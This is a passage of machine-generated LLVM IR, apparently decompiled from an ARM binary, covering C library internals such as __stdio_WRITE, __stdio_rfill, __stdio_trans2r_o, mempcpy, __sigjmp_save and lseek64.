bb20:                                             ; preds = %dec_label_pc_17a64
  %v2_17a68 = or i16 %v2_17a64, 4
  store i16 %v2_17a68, i16* %v1_17a64, align 2
  %v1_17a84.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_17a64
  %v2_17a6c = or i16 %v2_17a64, 8
  store i16 %v2_17a6c, i16* %v1_17a64, align 2
  %v1_17a78 = load i32, i32* @r5, align 4
  store i32 %v1_17a78, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_17a84 = phi i32 [ %v1_17a84.pre, %bb20 ], [ 0, %bb ], [ %v1_17a58, %bb19 ], [ %v1_17a78, %bb21 ]
  %v2_17a80 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17a80, i32* @r4, align 4
  ret i32 %v1_17a84

; uselistorder directives
  uselistorder i16 %v2_17a64, { 1, 0 }
  uselistorder i32 %v1_17a58, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @__libc_read, { 4, 2, 3, 0, 1 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 2147483647, i32* @r8, align 4
  %v2_17b4c2 = icmp eq i32 %arg3, 0
  store i1 %v2_17b4c2, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17b4c2, label %dec_label_pc_17b54, label %dec_label_pc_17aa4

dec_label_pc_17aa4:                               ; preds = %entry, %dec_label_pc_17b4cthread-pre-split.dec_label_pc_17aa4_crit_edge
  %v0_17ab0 = phi i32 [ %v0_17ab0.pre, %dec_label_pc_17b4cthread-pre-split.dec_label_pc_17aa4_crit_edge ], [ %tmp, %entry ]
  %v0_17aac = phi i32 [ %v5_17abc, %dec_label_pc_17b4cthread-pre-split.dec_label_pc_17aa4_crit_edge ], [ %arg2, %entry ]
  %v3_17aa4 = phi i32 [ %v3_17aa4.pre, %dec_label_pc_17b4cthread-pre-split.dec_label_pc_17aa4_crit_edge ], [ 2147483647, %entry ]
  %v0_17aa8.in = phi i32 [ %v5_17ac0, %dec_label_pc_17b4cthread-pre-split.dec_label_pc_17aa4_crit_edge ], [ %arg3, %entry ]
  %v3_17aa8 = phi i32 [ %v5_17ac0, %dec_label_pc_17b4cthread-pre-split.dec_label_pc_17aa4_crit_edge ], [ %arg3, %entry ]
  %v0_17aa8 = icmp slt i32 %v0_17aa8.in, 0
  %storemerge = select i1 %v0_17aa8, i32 %v3_17aa4, i32 %v3_17aa8
  store i32 %storemerge, i32* @r2, align 4
  store i32 %v0_17aac, i32* %r1.global-to-local, align 4
  %v1_17ab0 = add i32 %v0_17ab0, 4
  %v2_17ab0 = inttoptr i32 %v1_17ab0 to i32*
  %v3_17ab0 = load i32, i32* %v2_17ab0, align 4
  %tmp21 = inttoptr i32 %v0_17aac to i64*
  %v4_17ab4 = call i32 @__GI___libc_write(i32 %v3_17ab0, i64* %tmp21)
  %v1_17ab8 = icmp slt i32 %v4_17ab4, 0
  %v2_17ab8 = icmp eq i32 %v4_17ab4, 0
  store i1 %v2_17ab8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_17ab8, label %dec_label_pc_17ac8, label %dec_label_pc_17b4cthread-pre-split

dec_label_pc_17ac8:                               ; preds = %dec_label_pc_17aa4
  %v0_17ac8 = load i32, i32* @r4, align 4
  %v1_17ac8 = inttoptr i32 %v0_17ac8 to i16*
  %v2_17ac8 = load i16, i16* %v1_17ac8, align 2
  %v1_17acc = or i16 %v2_17ac8, 8
  store i16 %v1_17acc, i16* %v1_17ac8, align 2
  store i32 40788, i32* %r3.global-to-local, align 4
  %v0_17ad8 = call i32 @__aeabi_read_tp()
  %v3_17adc = load i16, i16* @global_var_21a38.351, align 2
  %v4_17adc = sext i16 %v3_17adc to i32
  store i32 %v4_17adc, i32* %r3.global-to-local, align 4
  %v2_17ae0 = add i32 %v4_17adc, %v0_17ad8
  %v3_17ae0 = inttoptr i32 %v2_17ae0 to i32*
  %v4_17ae0 = load i32, i32* %v3_17ae0, align 4
  store i32 %v4_17ae0, i32* %r3.global-to-local, align 4
  %v7_17ae4 = icmp eq i32 %v4_17ae0, 4
  store i1 %v7_17ae4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17ae4, label %dec_label_pc_17af0, label %bb22

bb22:                                             ; preds = %dec_label_pc_17ac8
  %v8_17ae8 = icmp eq i32 %v4_17ae0, 11
  store i1 %v8_17ae8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_17ae8, label %dec_label_pc_17af0, label %dec_label_pc_17b54

dec_label_pc_17af0:                               ; preds = %dec_label_pc_17ac8, %bb22
  %v0_17af0 = load i32, i32* @r4, align 4
  %v1_17af0 = add i32 %v0_17af0, 8
  store i32 %v1_17af0, i32* %r2.global-to-local, align 4
  %v1_17af4 = inttoptr i32 %v1_17af0 to i32*
  %v2_17af4 = load i32, i32* %v1_17af4, align 4
  store i32 %v2_17af4, i32* %r2.global-to-local, align 4
  %v3_17af4 = add i32 %v0_17af0, 12
  %v4_17af4 = inttoptr i32 %v3_17af4 to i32*
  %v5_17af4 = load i32, i32* %v4_17af4, align 4
  store i32 %v5_17af4, i32* %r3.global-to-local, align 4
  %v2_17af8 = sub i32 %v5_17af4, %v2_17af4
  store i32 %v2_17af8, i32* %r1.global-to-local, align 4
  %v9_17af8 = icmp eq i32 %v5_17af4, %v2_17af4
  store i1 %v9_17af8, i1* %cpsr_z.global-to-local, align 1
  %v0_17b44.pre = load i32, i32* @r5, align 4
  br i1 %v9_17af8, label %dec_label_pc_17b44, label %dec_label_pc_17b00

dec_label_pc_17b00:                               ; preds = %dec_label_pc_17af0
  %v3_17b00 = icmp ult i32 %v2_17af8, %v0_17b44.pre
  %v9_17b00 = icmp eq i32 %v2_17af8, %v0_17b44.pre
  store i1 %v9_17b00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_17b00, label %.preheader, label %bb23

bb23:                                             ; preds = %dec_label_pc_17b00
  store i32 %v0_17b44.pre, i32* %r1.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_17b00, %bb23, %dec_label_pc_17b28
  %v2_17b14 = phi i32 [ %v1_17b2c, %dec_label_pc_17b28 ], [ %v2_17af4, %bb23 ], [ %v2_17af4, %dec_label_pc_17b00 ]
  %v0_17b08 = load i32, i32* @r6, align 4
  %v1_17b08 = inttoptr i32 %v0_17b08 to i8*
  %v2_17b08 = load i8, i8* %v1_17b08, align 1
  %v3_17b08 = zext i8 %v2_17b08 to i32
  store i32 %v3_17b08, i32* %r3.global-to-local, align 4
  %v7_17b0c = icmp eq i8 %v2_17b08, 10
  store i1 %v7_17b0c, i1* %cpsr_z.global-to-local, align 1
  %v1_17b10 = add i32 %v0_17b08, 1
  store i32 %v1_17b10, i32* @r6, align 4
  %v3_17b14 = inttoptr i32 %v2_17b14 to i8*
  store i8 %v2_17b08, i8* %v3_17b14, align 1
  %v0_17b18 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17b18, label %dec_label_pc_17b1c, label %dec_label_pc_17b28

dec_label_pc_17b1c:                               ; preds = %.preheader
  %v0_17b1c = load i32, i32* @r4, align 4
  %v1_17b1c = inttoptr i32 %v0_17b1c to i16*
  %v2_17b1c = load i16, i16* %v1_17b1c, align 2
  %v3_17b1c = zext i16 %v2_17b1c to i32
  store i32 %v3_17b1c, i32* %r3.global-to-local, align 4
  %v1_17b20 = and i32 %v3_17b1c, 256
  %v2_17b20 = icmp eq i32 %v1_17b20, 0
  store i1 %v2_17b20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17b20, label %dec_label_pc_17b28, label %dec_label_pc_17b1c.dec_label_pc_17b34_crit_edge

dec_label_pc_17b1c.dec_label_pc_17b34_crit_edge:  ; preds = %dec_label_pc_17b1c
  %v0_17b38.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17b34

dec_label_pc_17b28:                               ; preds = %dec_label_pc_17b1c, %.preheader
  %v0_17b28 = load i32, i32* %r1.global-to-local, align 4
  %v1_17b28 = add i32 %v0_17b28, -1
  store i32 %v1_17b28, i32* %r1.global-to-local, align 4
  %v7_17b28 = icmp eq i32 %v0_17b28, 1
  store i1 %v7_17b28, i1* %cpsr_z.global-to-local, align 1
  %v0_17b2c = load i32, i32* %r2.global-to-local, align 4
  %v1_17b2c = add i32 %v0_17b2c, 1
  store i32 %v1_17b2c, i32* %r2.global-to-local, align 4
  br i1 %v7_17b28, label %dec_label_pc_17b28.dec_label_pc_17b34_crit_edge, label %.preheader

dec_label_pc_17b28.dec_label_pc_17b34_crit_edge:  ; preds = %dec_label_pc_17b28
  %v0_17b34.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17b34

dec_label_pc_17b34:                               ; preds = %dec_label_pc_17b1c.dec_label_pc_17b34_crit_edge, %dec_label_pc_17b28.dec_label_pc_17b34_crit_edge
  %v0_17b38 = phi i32 [ %v1_17b2c, %dec_label_pc_17b28.dec_label_pc_17b34_crit_edge ], [ %v0_17b38.pre, %dec_label_pc_17b1c.dec_label_pc_17b34_crit_edge ]
  %v0_17b34 = phi i32 [ %v0_17b34.pre, %dec_label_pc_17b28.dec_label_pc_17b34_crit_edge ], [ %v0_17b1c, %dec_label_pc_17b1c.dec_label_pc_17b34_crit_edge ]
  %v1_17b34 = add i32 %v0_17b34, 8
  %v2_17b34 = inttoptr i32 %v1_17b34 to i32*
  %v3_17b34 = load i32, i32* %v2_17b34, align 4
  store i32 %v3_17b34, i32* %r3.global-to-local, align 4
  %v2_17b38 = add i32 %v0_17b34, 16
  %v3_17b38 = inttoptr i32 %v2_17b38 to i32*
  store i32 %v0_17b38, i32* %v3_17b38, align 4
  %v0_17b3c = load i32, i32* %r3.global-to-local, align 4
  %v1_17b3c = load i32, i32* %r2.global-to-local, align 4
  %v2_17b3c = sub i32 %v1_17b3c, %v0_17b3c
  store i32 %v2_17b3c, i32* %r3.global-to-local, align 4
  %v1_17b40 = load i32, i32* @r5, align 4
  %v2_17b40 = sub i32 %v1_17b40, %v2_17b3c
  br label %dec_label_pc_17b44

dec_label_pc_17b44:                               ; preds = %dec_label_pc_17af0, %dec_label_pc_17b34
  %v0_17b44 = phi i32 [ %v2_17b40, %dec_label_pc_17b34 ], [ %v0_17b44.pre, %dec_label_pc_17af0 ]
  %v1_17b44 = load i32, i32* @r7, align 4
  %v2_17b44 = sub i32 %v1_17b44, %v0_17b44
  store i32 %v2_17b44, i32* @r7, align 4
  br label %dec_label_pc_17b54

dec_label_pc_17b4cthread-pre-split:               ; preds = %dec_label_pc_17aa4
  %v3_17abc = load i32, i32* @r6, align 4
  %v5_17abc = add i32 %v3_17abc, %v4_17ab4
  store i32 %v5_17abc, i32* @r6, align 4
  %v4_17ac0 = load i32, i32* @r5, align 4
  %v5_17ac0 = sub i32 %v4_17ac0, %v4_17ab4
  store i32 %v5_17ac0, i32* @r5, align 4
  %v2_17b4c = icmp eq i32 %v5_17ac0, 0
  store i1 %v2_17b4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17b4c, label %dec_label_pc_17b54, label %dec_label_pc_17b4cthread-pre-split.dec_label_pc_17aa4_crit_edge

dec_label_pc_17b4cthread-pre-split.dec_label_pc_17aa4_crit_edge: ; preds = %dec_label_pc_17b4cthread-pre-split
  %v3_17aa4.pre = load i32, i32* @r8, align 4
  %v0_17ab0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17aa4

dec_label_pc_17b54:                               ; preds = %dec_label_pc_17b4cthread-pre-split, %entry, %bb22, %dec_label_pc_17b44
  %v0_17b54 = load i32, i32* @r7, align 4
  ret i32 %v0_17b54

; uselistorder directives
  uselistorder i32 %v5_17ac0, { 1, 3, 0, 2 }
  uselistorder i32 %v5_17abc, { 1, 0 }
  uselistorder i32 %v0_17b34, { 1, 0 }
  uselistorder i32 %v1_17b2c, { 0, 2, 1 }
  uselistorder i32 %v0_17b28, { 1, 0 }
  uselistorder i32 %v0_17b44.pre, { 0, 3, 1, 2 }
  uselistorder i32 %v5_17af4, { 1, 0, 2 }
  uselistorder i32 %v2_17af4, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v4_17ab4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_17aac, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i8 10, { 2, 3, 0, 1 }
  uselistorder i32 11, { 14, 8, 9, 10, 21, 28, 29, 2, 11, 3, 12, 4, 13, 15, 16, 17, 5, 18, 19, 20, 22, 23, 6, 24, 7, 25, 0, 26, 1, 27, 30 }
  uselistorder i32 2147483647, { 1, 6, 7, 0, 2, 3, 4, 5 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_17b54, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_17b44, { 1, 0 }
  uselistorder label %dec_label_pc_17b34, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17af0, { 1, 0 }
  uselistorder label %dec_label_pc_17aa4, { 1, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17b64 = load i32, i32* @r4, align 4
  store i32 %v3_17b64, i32* %stack_var_-8, align 4
  %v1_17b68 = add i32 %arg1, 8
  %v1_17b6c = inttoptr i32 %v1_17b68 to i32*
  %v2_17b6c = load i32, i32* %v1_17b6c, align 4
  store i32 %v2_17b6c, i32* @r1, align 4
  %v3_17b6c = add i32 %arg1, 12
  %v4_17b6c = inttoptr i32 %v3_17b6c to i32*
  %v5_17b6c = load i32, i32* %v4_17b6c, align 4
  %v2_17b70 = sub i32 %v5_17b6c, %v2_17b6c
  store i32 %v2_17b70, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_17b78 = inttoptr i32 %arg1 to i16*
  %v4_17b78 = call i32 @__stdio_READ(i16* %v3_17b78, i32 %v2_17b6c, i32 %v2_17b70)
  %v0_17b7c = load i32, i32* @r4, align 4
  %v1_17b7c = add i32 %v0_17b7c, 8
  %v2_17b7c = inttoptr i32 %v1_17b7c to i32*
  %v3_17b7c = load i32, i32* %v2_17b7c, align 4
  store i32 %v3_17b7c, i32* %r2.global-to-local, align 4
  %v2_17b80 = add i32 %v3_17b7c, %v4_17b78
  %v2_17b84 = add i32 %v0_17b7c, 20
  %v3_17b84 = inttoptr i32 %v2_17b84 to i32*
  store i32 %v2_17b80, i32* %v3_17b84, align 4
  %v0_17b88 = load i32, i32* %r2.global-to-local, align 4
  %v1_17b88 = load i32, i32* @r4, align 4
  %v2_17b88 = add i32 %v1_17b88, 16
  %v3_17b88 = inttoptr i32 %v2_17b88 to i32*
  store i32 %v0_17b88, i32* %v3_17b88, align 4
  %v2_17b8c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17b8c, i32* @r4, align 4
  ret i32 %v4_17b78

; uselistorder directives
  uselistorder i32 %v4_17b78, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_17b94 = load i32, i32* @r4, align 4
  store i32 %v3_17b94, i32* %stack_var_-12, align 4
  %v0_17b98 = load i32, i32* @r0, align 4
  %v1_17b98 = inttoptr i32 %v0_17b98 to i16*
  %v2_17b98 = load i16, i16* %v1_17b98, align 2
  %v3_17b98 = zext i16 %v2_17b98 to i32
  store i32 %v3_17b98, i32* %r3.global-to-local, align 4
  %v0_17b9c = load i32, i32* @r1, align 4
  %v2_17b9c = and i32 %v0_17b9c, %v3_17b98
  %v4_17b9c = icmp eq i32 %v2_17b9c, 0
  store i32 %v0_17b98, i32* @r4, align 4
  br i1 %v4_17b9c, label %dec_label_pc_17bac, label %dec_label_pc_17bbc

dec_label_pc_17bac:                               ; preds = %entry
  %v1_17bac = and i32 %v3_17b98, 2176
  %v2_17bac = icmp eq i32 %v1_17bac, 0
  br i1 %v2_17bac, label %dec_label_pc_17bb4, label %dec_label_pc_17bc8

dec_label_pc_17bb4:                               ; preds = %dec_label_pc_17bac
  %v2_17bb4 = or i32 %v0_17b9c, %v3_17b98
  store i32 %v2_17bb4, i32* %r3.global-to-local, align 4
  %v1_17bb8 = trunc i32 %v2_17bb4 to i16
  store i16 %v1_17bb8, i16* %v1_17b98, align 2
  %v0_17bbc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17bbc

dec_label_pc_17bbc:                               ; preds = %entry, %dec_label_pc_17bb4
  %v0_17bbc = phi i32 [ %v0_17b98, %entry ], [ %v0_17bbc.pre, %dec_label_pc_17bb4 ]
  %v1_17bbc = inttoptr i32 %v0_17bbc to i16*
  %v2_17bbc = load i16, i16* %v1_17bbc, align 2
  %v3_17bbc = zext i16 %v2_17bbc to i32
  store i32 %v3_17bbc, i32* %r3.global-to-local, align 4
  %v1_17bc0 = and i32 %v3_17bbc, 16
  store i32 %v1_17bc0, i32* %r5.global-to-local, align 4
  %v2_17bc0 = icmp eq i32 %v1_17bc0, 0
  br i1 %v2_17bc0, label %dec_label_pc_17bf0, label %dec_label_pc_17bc8

dec_label_pc_17bc8:                               ; preds = %dec_label_pc_17bac, %dec_label_pc_17bbc
  store i32 40544, i32* %r3.global-to-local, align 4
  %v0_17bcc = call i32 @__aeabi_read_tp()
  store i32 %v0_17bcc, i32* %r0.global-to-local, align 4
  %v3_17bd0 = load i16, i16* @global_var_21a38.351, align 2
  %v4_17bd0 = sext i16 %v3_17bd0 to i32
  store i32 %v4_17bd0, i32* %r3.global-to-local, align 4
  %v3_17bd8 = add i32 %v4_17bd0, %v0_17bcc
  %v4_17bd8 = inttoptr i32 %v3_17bd8 to i32*
  store i32 9, i32* %v4_17bd8, align 4
  br label %dec_label_pc_17bdc

dec_label_pc_17bdc:                               ; preds = %dec_label_pc_17bf8, %dec_label_pc_17bc8
  %v0_17bdc = load i32, i32* @r4, align 4
  %v1_17bdc = inttoptr i32 %v0_17bdc to i16*
  %v2_17bdc = load i16, i16* %v1_17bdc, align 2
  %v3_17bdc = zext i16 %v2_17bdc to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_17be4 = or i32 %v3_17bdc, 8
  store i32 %v1_17be4, i32* %r3.global-to-local, align 4
  %v1_17be8 = trunc i32 %v1_17be4 to i16
  store i16 %v1_17be8, i16* %v1_17bdc, align 2
  %v1_17c30.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17c28

dec_label_pc_17bf0:                               ; preds = %dec_label_pc_17bbc
  %v1_17bf0 = and i32 %v3_17bbc, 64
  %v2_17bf0 = icmp eq i32 %v1_17bf0, 0
  br i1 %v2_17bf0, label %dec_label_pc_17c18, label %dec_label_pc_17bf8

dec_label_pc_17bf8:                               ; preds = %dec_label_pc_17bf0
  %v0_17bf8 = load i32, i32* @r0, align 4
  %v1_17bf8 = call i32 @__stdio_wcommit(i32 %v0_17bf8)
  store i32 %v1_17bf8, i32* %r0.global-to-local, align 4
  %v2_17bfc = icmp eq i32 %v1_17bf8, 0
  br i1 %v2_17bfc, label %dec_label_pc_17c04, label %dec_label_pc_17bdc

dec_label_pc_17c04:                               ; preds = %dec_label_pc_17bf8
  %v0_17c04 = load i32, i32* @r4, align 4
  %v1_17c04 = inttoptr i32 %v0_17c04 to i16*
  %v2_17c04 = load i16, i16* %v1_17c04, align 2
  %v3_17c04 = zext i16 %v2_17c04 to i32
  store i32 %v3_17c04, i32* %r3.global-to-local, align 4
  %v1_17c08 = add i32 %v0_17c04, 8
  %v2_17c08 = inttoptr i32 %v1_17c08 to i32*
  %v3_17c08 = load i32, i32* %v2_17c08, align 4
  %v1_17c0c = and i32 %v3_17c04, 65471
  store i32 %v1_17c0c, i32* %r3.global-to-local, align 4
  %v2_17c10 = add i32 %v0_17c04, 28
  %v3_17c10 = inttoptr i32 %v2_17c10 to i32*
  store i32 %v3_17c08, i32* %v3_17c10, align 4
  %v0_17c14 = load i32, i32* %r3.global-to-local, align 4
  %v1_17c14 = trunc i32 %v0_17c14 to i16
  %v2_17c14 = load i32, i32* @r4, align 4
  %v3_17c14 = inttoptr i32 %v2_17c14 to i16*
  store i16 %v1_17c14, i16* %v3_17c14, align 2
  %v0_17c18.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17c18

dec_label_pc_17c18:                               ; preds = %dec_label_pc_17bf0, %dec_label_pc_17c04
  %v2_17c20 = phi i32 [ %v0_17bbc, %dec_label_pc_17bf0 ], [ %v0_17c18.pre, %dec_label_pc_17c04 ]
  %v1_17c18 = inttoptr i32 %v2_17c20 to i16*
  %v2_17c18 = load i16, i16* %v1_17c18, align 2
  %v3_17c18 = zext i16 %v2_17c18 to i32
  %v1_17c1c = or i32 %v3_17c18, 1
  store i32 %v1_17c1c, i32* %r3.global-to-local, align 4
  %v1_17c20 = trunc i32 %v1_17c1c to i16
  store i16 %v1_17c20, i16* %v1_17c18, align 2
  %v0_17c24 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_17c24, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17c28

dec_label_pc_17c28:                               ; preds = %dec_label_pc_17bdc, %dec_label_pc_17c18
  %v1_17c30 = phi i32 [ %v1_17c30.pre, %dec_label_pc_17bdc ], [ %v0_17c24, %dec_label_pc_17c18 ]
  %v2_17c2c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17c2c, i32* @r4, align 4
  ret i32 %v1_17c30

; uselistorder directives
  uselistorder i32 %v3_17b98, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17c28, { 1, 0 }
  uselistorder label %dec_label_pc_17c18, { 1, 0 }
  uselistorder label %dec_label_pc_17bc8, { 1, 0 }
  uselistorder label %dec_label_pc_17bbc, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v3_17c38 = load i32, i32* @r4, align 4
  %v6_17c38 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_17c48 = call i32 @memcpy()
  %v0_17c4c = load i32, i32* @r5, align 4
  %v1_17c4c = load i32, i32* @r4, align 4
  %v2_17c4c = add i32 %v1_17c4c, %v0_17c4c
  store i32 %v3_17c38, i32* @r4, align 4
  store i32 %v6_17c38, i32* @r5, align 4
  ret i32 %v2_17c4c
}

define i32 @__sigjmp_save() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_17c5c = load i32, i32* @r1, align 4
  %v2_17c5c = icmp eq i32 %v0_17c5c, 0
  %v3_17c60 = load i32, i32* @r4, align 4
  store i32 %v3_17c60, i32* %stack_var_-8, align 4
  %v0_17c64 = load i32, i32* @r0, align 4
  store i32 %v0_17c64, i32* %r4.global-to-local, align 4
  br i1 %v2_17c5c, label %dec_label_pc_17c88, label %dec_label_pc_17c6c

dec_label_pc_17c6c:                               ; preds = %entry
  %v1_17c74 = add i32 %v0_17c64, 260
  %v4_17c78 = call i32 @__GI_sigprocmask(i32 0, i32* null, i32 %v1_17c74)
  %v2_17c7c = icmp eq i32 %v4_17c78, 0
  br i1 %v2_17c7c, label %dec_label_pc_17c8c, label %dec_label_pc_17c88

dec_label_pc_17c88:                               ; preds = %dec_label_pc_17c6c, %entry
  br label %dec_label_pc_17c8c

dec_label_pc_17c8c:                               ; preds = %dec_label_pc_17c6c, %dec_label_pc_17c88
  %storemerge = phi i32 [ 0, %dec_label_pc_17c88 ], [ 1, %dec_label_pc_17c6c ]
  %v1_17c90 = load i32, i32* %r4.global-to-local, align 4
  %v2_17c90 = add i32 %v1_17c90, 256
  %v3_17c90 = inttoptr i32 %v2_17c90 to i32*
  store i32 %storemerge, i32* %v3_17c90, align 4
  %v2_17c94 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17c94, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32, i32*, i32)* @__GI_sigprocmask, { 1, 2, 0 }
  uselistorder i32* null, { 9, 0, 5, 6, 1, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 2, 20, 21, 22, 3, 23, 4, 24 }
  uselistorder i32 260, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_17c8c, { 1, 0 }
}

define i32 @__GI_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ult i32 %arg1, -4095
  br i1 %tmp10, label %dec_label_pc_17ce4, label %dec_label_pc_17cc8

dec_label_pc_17cc8:                               ; preds = %entry
  %v0_17ccc = call i32 @__aeabi_read_tp()
  %v3_17cd0 = load i16, i16* @global_var_21a38.351, align 2
  %v4_17cd0 = sext i16 %v3_17cd0 to i32
  %v0_17cd4 = load i32, i32* %r2.global-to-local, align 4
  %v1_17cd4 = sub i32 0, %v0_17cd4
  store i32 %v1_17cd4, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_17cdc = add i32 %v4_17cd0, %v0_17ccc
  %v4_17cdc = inttoptr i32 %v3_17cdc to i32*
  store i32 %v1_17cd4, i32* %v4_17cdc, align 4
  %v0_17cec.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17cec

dec_label_pc_17ce4:                               ; preds = %entry
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v2_17ce4 = icmp eq i32 %arg1, 0
  br i1 %v2_17ce4, label %dec_label_pc_17cf8, label %dec_label_pc_17cec

dec_label_pc_17cec:                               ; preds = %dec_label_pc_17ce4, %dec_label_pc_17cc8
  %v0_17cec = phi i32 [ %arg1, %dec_label_pc_17ce4 ], [ %v0_17cec.pre, %dec_label_pc_17cc8 ]
  %v3_17cf0 = ashr i32 %v0_17cec, 31
  br label %dec_label_pc_17cfc

dec_label_pc_17cf8:                               ; preds = %dec_label_pc_17ce4
  br label %dec_label_pc_17cfc

dec_label_pc_17cfc:                               ; preds = %dec_label_pc_17cec, %dec_label_pc_17cf8
  %v1_17d04 = phi i32 [ %v0_17cec, %dec_label_pc_17cec ], [ %tmp8, %dec_label_pc_17cf8 ]
  %storemerge = phi i32 [ %v3_17cf0, %dec_label_pc_17cec ], [ %tmp, %dec_label_pc_17cf8 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  ret i32 %v1_17d04

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 31, { 6, 4, 5, 7, 8, 0, 1, 2, 3 }
  uselistorder i16 8, { 3, 0, 1, 2, 4 }
  uselistorder i16* @global_var_21a38.351, { 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @__aeabi_read_tp, { 65, 71, 70, 64, 63, 80, 79, 68, 69, 67, 66, 78, 77, 76, 75, 74, 73, 72, 18, 26, 28, 34, 62, 43, 42, 12, 6, 5, 11, 25, 24, 10, 3, 2, 13, 9, 8, 7, 48, 15, 23, 47, 46, 27, 20, 22, 21, 59, 58, 31, 30, 29, 32, 33, 57, 45, 56, 55, 17, 16, 54, 19, 61, 60, 41, 38, 37, 36, 44, 4, 53, 52, 35, 51, 14, 50, 49, 0, 1, 40, 39 }
  uselistorder i32 -4095, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 37, 38, 39 }
